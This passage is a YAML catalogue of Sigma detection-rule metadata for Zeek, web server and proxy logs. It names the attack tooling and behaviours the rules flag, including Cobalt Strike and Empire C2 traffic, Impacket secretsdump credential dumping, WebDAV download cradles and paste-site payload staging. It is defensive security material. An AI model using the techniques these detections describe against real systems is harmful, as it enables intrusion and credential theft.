  data_sources: []
  tactics: []
  techniques:
  - T1095
  - T1571
  tags:
  - attack.t1095
  - attack.t1571
  - attack.command-and-control
  time_window: ''
  references:
  - https://twitter.com/neu5ron/status/1346245602502443009
  - https://tdm.socprime.com/tdm/info/eLbyj4JjI15v#sigma
  - https://tools.ietf.org/html/rfc2929#section-2.1
  - https://www.netresec.com/?page=Blog&month=2021-01&post=Finding-Targeted-SUNBURST-Victims-with-pDNS
  false_positives:
  - Internal or legitimate external domains using DNSSec. Verify if these are legitimate
    DNSSec domains and then exclude them.
  - If you work in a Public Sector then it may be good to exclude things like endswith
    ".edu", ".gov" and or ".mil"
  notes: ''
- detection_id: a8322756-015c-42e7-afb1-436e85ed3ff5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_dns_torproxy.yml
  name: DNS TOR Proxies
  description: Identifies IPs performing DNS lookups associated with common Tor proxies.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: zeek
  product: dns
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://github.com/Azure/Azure-Sentinel/blob/f99542b94afe0ad2f19a82cc08262e7ac8e1428e/Detections/ASimDNS/imDNS_TorProxies.yaml
  false_positives:
  - Unknown
  notes: ''
- detection_id: aac2fd97-bcba-491b-ad66-a6edf89c71bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_http_executable_download_from_webdav.yml
  name: Executable from Webdav
  description: Detects executable access via webdav6. Can be seen in APT 29 such as
    from the emulated APT 29 hackathon https://github.com/OTRF/detection-hackathon-apt29/
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: zeek
  product: http
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - http://carnal0wnage.attackresearch.com/2012/06/webdav-server-to-download-custom.html
  - https://github.com/OTRF/detection-hackathon-apt29
  false_positives:
  - Unknown
  notes: ''
- detection_id: 68c2c604-92ad-468b-bf4a-aac49adad08c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_http_susp_file_ext_from_susp_tld.yml
  name: HTTP Request to Low Reputation TLD or Suspicious File Extension
  description: 'Detects HTTP requests to low reputation TLDs (e.g. .xyz, .top, .ru)
    or ending in suspicious file extensions (.exe, .dll, .hta), which may indicate
    malicious activity.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: experimental
  platform: zeek
  product: http
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - attack.command-and-control
  time_window: ''
  references:
  - https://www.howtogeek.com/137270/50-file-extensions-that-are-potentially-dangerous-on-windows
  - https://www.spamhaus.org/reputation-statistics/cctlds/domains/
  false_positives:
  - Rare legitimate software downloads from low quality TLDs
  notes: ''
- detection_id: 705072a5-bb6f-4ced-95b6-ecfa6602090b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_http_webdav_put_request.yml
  name: WebDav Put Request
  description: A General detection for WebDav user-agent being used to PUT files on
    a WebDav network share. This could be an indicator of exfiltration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: zeek
  product: http
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048.003
  tags:
  - attack.exfiltration
  - attack.t1048.003
  time_window: ''
  references:
  - https://github.com/OTRF/detection-hackathon-apt29/issues/17
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1fc0809e-06bf-4de3-ad52-25e5263b7623
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_rdp_public_listener.yml
  name: Publicly Accessible RDP Service
  description: 'Detects connections from routable IPs to an RDP listener. Which is
    indicative of a publicly-accessible RDP service.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: zeek
  product: rdp
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.001
  tags:
  - attack.lateral-movement
  - attack.t1021.001
  time_window: ''
  references: []
  false_positives:
  - Although it is recommended to NOT have RDP exposed to the internet, verify that
    this is a) allowed b) the server has not already been compromised via some brute
    force or remote exploit since it has been exposed to the internet. Work to secure
    the server if you are unable to remove it from being exposed to the internet.
  notes: ''
- detection_id: dde85b37-40cd-4a94-b00c-0b8794f956b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_atsvc_task.yml
  name: Remote Task Creation via ATSVC Named Pipe - Zeek
  description: Detects remote task creation via at.exe or API interacting with ATSVC
    namedpipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.002
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.lateral-movement
  - attack.persistence
  - car.2013-05-004
  - car.2015-04-001
  - attack.t1053.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230409194125/https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 92dae1ed-1c9d-4eff-a567-33acbd95b00e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_impacket_secretdump.yml
  name: Possible Impacket SecretDump Remote Activity - Zeek
  description: Detect AD credential dumping using impacket secretdump HKTL. Based
    on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.003
  - T1003.004
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.003
  time_window: ''
  references:
  - https://web.archive.org/web/20230329153811/https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 021310d9-30a6-480a-84b7-eaa69aeb92bb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_lm_namedpipe.yml
  name: First Time Seen Remote Named Pipe - Zeek
  description: This detection excludes known namped pipes accessible remotely and
    notify on newly observed ones, may help to detect lateral movement and remote
    exec using named pipes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://twitter.com/menasec1/status/1104489274387451904
  false_positives:
  - Update the excluded named pipe to filter out any newly observed legit named pipe
  notes: ''
- detection_id: f1b3a22a-45e6-4004-afb5-4291f9c21166
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_susp_psexec.yml
  name: Suspicious PsExec Execution - Zeek
  description: detects execution of psexec or paexec with renamed service name, this
    rule helps to filter out the noise if psexec is used for legit purposes or if
    attacker uses a different psexec client other than sysinternal one
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.002
  tags:
  - attack.lateral-movement
  - attack.t1021.002
  time_window: ''
  references:
  - https://web.archive.org/web/20230329171218/https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 286b47ed-f6fe-40b3-b3a8-35129acd43bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_susp_raccess_sensitive_fext.yml
  name: Suspicious Access to Sensitive File Extensions - Zeek
  description: Detects known sensitive file extensions via Zeek
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques: []
  tags:
  - attack.collection
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Help Desk operator doing backup or re-imaging end user machine or backup software
  - Users working with these data types or exchanging message files
  notes: ''
- detection_id: 2e69f167-47b5-4ae7-a390-47764529eff5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_smb_converted_win_transferring_files_with_credential_data.yml
  name: Transferring Files with Credential Data via Network Shares - Zeek
  description: Transferring files with well-known filenames (sensitive files with
    credential data) using network shares
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: zeek
  product: smb_files
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.001
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Transferring sensitive files for legitimate administration work by legitimate
    administrator
  notes: ''
- detection_id: 503fe26e-b5f2-4944-a126-eab405cc06e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/network/zeek/zeek_susp_kerberos_rc4.yml
  name: Kerberos Network Traffic RC4 Ticket Encryption
  description: Detects kerberos TGS request using RC4 encryption which may be indicative
    of kerberoasting
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: zeek
  product: kerberos
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1558.003
  tags:
  - attack.credential-access
  - attack.t1558.003
  time_window: ''
  references:
  - https://adsecurity.org/?p=3458
  false_positives:
  - Normal enterprise SPN requests activity
  notes: ''
- detection_id: 1da8ce0b-855d-4004-8860-7d64d42063b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/product/apache/web_apache_segfault.yml
  name: Apache Segmentation Fault
  description: Detects a segmentation fault error message caused by a crashing apache
    worker process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: apache
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1499.004
  tags:
  - attack.impact
  - attack.t1499.004
  time_window: ''
  references:
  - http://www.securityfocus.com/infocus/1633
  false_positives:
  - Unknown
  notes: ''
- detection_id: e9a2b582-3f6a-48ac-b4a1-6849cdc50b3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/product/apache/web_apache_threading_error.yml
  name: Apache Threading Error
  description: Detects an issue in apache logs that reports threading related errors
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: ''
  product: apache
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1190
  - T1210
  tags:
  - attack.initial-access
  - attack.lateral-movement
  - attack.t1190
  - attack.t1210
  time_window: ''
  references:
  - https://github.com/hannob/apache-uaf/blob/da40f2be3684c8095ec6066fa68eb5c07a086233/README.md
  false_positives:
  - 3rd party apache modules - https://bz.apache.org/bugzilla/show_bug.cgi?id=46185
  notes: ''
- detection_id: 59ec40bb-322e-40ab-808d-84fa690d7e56
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/product/nginx/web_nginx_core_dump.yml
  name: Nginx Core Dump
  description: Detects a core dump of a crashing Nginx worker process, which could
    be a signal of a serious problem or exploitation attempts.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: nginx
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1499.004
  tags:
  - attack.impact
  - attack.t1499.004
  time_window: ''
  references:
  - https://docs.nginx.com/nginx/admin-guide/monitoring/debugging/#enabling-core-dumps
  - https://www.x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/
  false_positives:
  - Serious issues with a configuration or plugin
  notes: ''
- detection_id: 195c1119-ef07-4909-bb12-e66f5e07bf3c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_download_susp_dyndns.yml
  name: Download from Suspicious Dyndns Hosts
  description: Detects download of certain file types from hosts with dynamic DNS
    names (selected list)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1105
  - T1568
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1105
  - attack.t1568
  time_window: ''
  references:
  - https://www.alienvault.com/blogs/security-essentials/dynamic-dns-security-and-potential-threats
  false_positives:
  - Software downloads
  notes: ''
- detection_id: 00d0b5ab-1f55-4120-8e83-487c0a7baf19
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_download_susp_tlds_blacklist.yml
  name: Download From Suspicious TLD - Blacklist
  description: Detects download of certain file types from hosts in suspicious TLDs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: low
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1204.002
  - T1566
  tags:
  - attack.initial-access
  - attack.t1566
  - attack.execution
  - attack.t1203
  - attack.t1204.002
  time_window: ''
  references:
  - https://www.symantec.com/connect/blogs/shady-tld-research-gdn-and-our-2016-wrap
  - https://promos.mcafee.com/en-US/PDF/MTMW_Report.pdf
  - https://www.spamhaus.org/statistics/tlds/
  - https://krebsonsecurity.com/2018/06/bad-men-at-work-please-dont-click/
  false_positives:
  - All kinds of software downloads
  notes: ''
- detection_id: b5de2919-b74a-4805-91a7-5049accbaefe
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_download_susp_tlds_whitelist.yml
  name: Download From Suspicious TLD - Whitelist
  description: Detects executable downloads from suspicious remote systems
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1203
  - T1204.002
  - T1566
  tags:
  - attack.initial-access
  - attack.t1566
  - attack.execution
  - attack.t1203
  - attack.t1204.002
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - All kind of software downloads
  notes: ''
- detection_id: e09aed7a-09e0-4c9a-90dd-f0d52507347e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_downloadcradle_webdav.yml
  name: Windows WebDAV User Agent
  description: Detects WebDav DownloadCradle
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://mgreen27.github.io/posts/2018/04/02/DownloadCradle.html
  false_positives:
  - Administrative scripts that download files from the Internet
  - Administrative scripts that retrieve certain website contents
  - Legitimate WebDAV administration
  notes: ''
- detection_id: b59c98c6-95e8-4d65-93ee-f594dfb96b17
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_f5_tm_utility_bash_api_request.yml
  name: F5 BIG-IP iControl Rest API Command Execution - Proxy
  description: Detects POST requests to the F5 BIG-IP iControl Rest API "bash" endpoint,
    which allows the execution of commands on the BIG-IP
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://f5-sdk.readthedocs.io/en/latest/apidoc/f5.bigip.tm.util.html#module-f5.bigip.tm.util.bash
  - https://community.f5.com/t5/technical-forum/icontrolrest-11-5-execute-bash-command/td-p/203029
  - https://community.f5.com/t5/technical-forum/running-bash-commands-via-rest-api/td-p/272516
  false_positives:
  - Legitimate usage of the BIG IP REST API to execute command for administration
    purposes
  notes: ''
- detection_id: 1712bafe-be05-4a0e-89d4-17a3ed151bf5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_hello_world_user_agent.yml
  name: Potential Hello-World Scraper Botnet Activity
  description: 'Detects network traffic potentially associated with a scraper botnet
    variant that uses the "Hello-World/1.0" user-agent string.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: experimental
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1595
  tags:
  - attack.reconnaissance
  - attack.t1595
  time_window: ''
  references:
  - https://www.greynoise.io/blog/new-scraper-botnet-concentrated-in-taiwan
  - https://viz.greynoise.io/tags/hello-world-scraper-botnet?days=30
  false_positives:
  - Legitimate network monitoring or vulnerability scanning tools that may use this
    generic user agent.
  - Internal development or testing scripts. Consider filtering by source IP if this
    is expected from certain systems.
  notes: ''
- detection_id: 304810ed-8853-437f-9e36-c4975c3dfd7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_hktl_baby_shark_default_agent_url.yml
  name: HackTool - BabyShark Agent Default URL Pattern
  description: Detects Baby Shark C2 Framework default communication patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://nasbench.medium.com/understanding-detecting-c2-frameworks-babyshark-641be4595845
  false_positives:
  - Unlikely
  notes: ''
- detection_id: f3f21ce1-cdef-4bfc-8328-ed2e826f5fac
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_hktl_cobalt_strike_malleable_c2_requests.yml
  name: HackTool - CobaltStrike Malleable Profile Patterns - Proxy
  description: Detects cobalt strike malleable profiles patterns (URI, User-Agents,
    Methods).
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/amazon.profile
  - https://www.hybrid-analysis.com/sample/ee5eca8648e45e2fea9dac0d920ef1a1792d8690c41ee7f20343de1927cc88b9?environmentId=100
  - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/ocsp.profile
  - https://github.com/yeyintminthuhtut/Malleable-C2-Profiles-Collection/
  - https://github.com/rsmudge/Malleable-C2-Profiles/blob/26323784672913923d20c5a638c6ca79459e8529/normal/onedrive_getonly.profile
  false_positives:
  - Unknown
  notes: ''
- detection_id: b923f7d6-ac89-4a50-a71a-89fb846b4aa8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_hktl_empire_ua_uri_patterns.yml
  name: HackTool - Empire UserAgent URI Combo
  description: Detects user agent and URI paths used by empire agents
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://github.com/BC-SECURITY/Empire
  false_positives:
  - Valid requests with this exact user agent to server scripts of the defined names
  notes: ''
- detection_id: 1a9bb21a-1bb5-42d7-aa05-3219c7c8f47d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_pua_advanced_ip_scanner_update_check.yml
  name: PUA - Advanced IP/Port Scanner Update Check
  description: Detect the update check performed by Advanced IP/Port Scanner utilities.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Discovery
  - Reconnaissance
  techniques:
  - T1590
  tags:
  - attack.discovery
  - attack.reconnaissance
  - attack.t1590
  time_window: ''
  references:
  - https://www.advanced-ip-scanner.com/
  - https://www.advanced-port-scanner.com/
  false_positives:
  - Expected if you legitimately use the Advanced IP or Port Scanner utilities in
    your environement.
  notes: ''
- detection_id: 2b1ee7e4-89b6-4739-b7bb-b811b6607e5e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_pwndrop.yml
  name: PwnDrp Access
  description: Detects downloads from PwnDrp web servers developed for red team testing
    and most likely also used for criminal activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1102.001
  - T1102.003
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1102.001
  - attack.t1102.003
  time_window: ''
  references:
  - https://breakdev.org/pwndrop/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5468045b-4fcc-4d1a-973c-c9c9578edacb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_raw_paste_service_access.yml
  name: Raw Paste Service Access
  description: Detects direct access to raw pastes in different paste services often
    used by malware in their second stages to download malicious code in encrypted
    or encoded form
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1102.001
  - T1102.003
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1102.001
  - attack.t1102.003
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.virustotal.com/gui/domain/paste.ee/relations
  false_positives:
  - User activity (e.g. developer that shared and copied code snippets and used the
    raw link instead of just copy & paste)
  notes: ''
- detection_id: 4922a5dd-6743-4fc2-8e81-144374280997
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_susp_flash_download_loc.yml
  name: Flash Player Update from Suspicious Location
  description: Detects a flashplayer update from an unofficial location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1036.005
  - T1189
  - T1204.002
  tags:
  - attack.initial-access
  - attack.t1189
  - attack.execution
  - attack.t1204.002
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - https://gist.github.com/roycewilliams/a723aaf8a6ac3ba4f817847610935cfb
  false_positives:
  - Unknown flash download locations
  notes: ''
- detection_id: eb6c2004-1cef-427f-8885-9042974e5eb6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_susp_ipfs_cred_harvest.yml
  name: Suspicious Network Communication With IPFS
  description: Detects connections to interplanetary file system (IPFS) containing
    a user's email address which mirrors behaviours observed in recent phishing campaigns
    leveraging IPFS to host credential harvesting webpages.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1056
  tags:
  - attack.collection
  - attack.credential-access
  - attack.t1056
  time_window: ''
  references:
  - https://blog.talosintelligence.com/ipfs-abuse/
  - https://github.com/Cisco-Talos/IOCs/tree/80caca039988252fbb3f27a2e89c2f2917f582e0/2022/11
  - https://isc.sans.edu/diary/IPFS%20phishing%20and%20the%20need%20for%20correctly%20set%20HTTP%20security%20headers/29638
  false_positives:
  - Legitimate use of IPFS being used in the organisation. However the cs-uri regex
    looking for a user email will likely negate this.
  notes: ''
- detection_id: b494b165-6634-483d-8c47-2026a6c52372
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_telegram_api.yml
  name: Telegram API Access
  description: Detects suspicious requests to Telegram API without the usual Telegram
    User-Agent
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  - T1102.002
  tags:
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1071.001
  - attack.t1102.002
  time_window: ''
  references:
  - https://researchcenter.paloaltonetworks.com/2018/03/unit42-telerat-another-android-trojan-leveraging-telegrams-bot-api-to-target-iranian-users/
  - https://blog.malwarebytes.com/threat-analysis/2016/11/telecrypt-the-ransomware-abusing-telegram-api-defeated/
  - https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/
  false_positives:
  - Legitimate use of Telegram bots in the company
  notes: ''
- detection_id: 6ec820f2-e963-4801-9127-d8b2dce4d31b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_apt.yml
  name: APT User Agent
  description: Detects suspicious user agent strings used in APT malware in proxy
    logs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Old browsers
  notes: ''
- detection_id: d443095b-a221-4957-a2c4-cd1756c9b747
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_base64_encoded.yml
  name: Suspicious Base64 Encoded User-Agent
  description: Detects suspicious encoded User-Agent strings, as seen used by some
    malware.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: medium
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1071.001
  tags:
  - attack.command-and-control
  - attack.t1071.001
  time_window: ''
  references:
  - https://deviceatlas.com/blog/list-of-user-agent-strings#desktop
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8ccd35a2-1c7c-468b-b568-ac6cdf80eec3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_bitsadmin_susp_ip.yml
  name: Bitsadmin to Uncommon IP Server Address
  description: Detects Bitsadmin connections to IP addresses instead of FQDN names
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1071.001
  - T1197
  tags:
  - attack.command-and-control
  - attack.t1071.001
  - attack.defense-evasion
  - attack.persistence
  - attack.t1197
  - attack.s0190
  time_window: ''
  references:
  - https://isc.sans.edu/diary/Microsoft+BITS+Used+to+Download+Payloads/21027
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9eb68894-7476-4cd6-8752-23b51f5883a7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/web/proxy_generic/proxy_ua_bitsadmin_susp_tld.yml
  name: Bitsadmin to Uncommon TLD
  description: Detects Bitsadmin connections to domains with uncommon TLDs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors:
  - guardrail:ioc_only_cap
  severity: high
  status: test
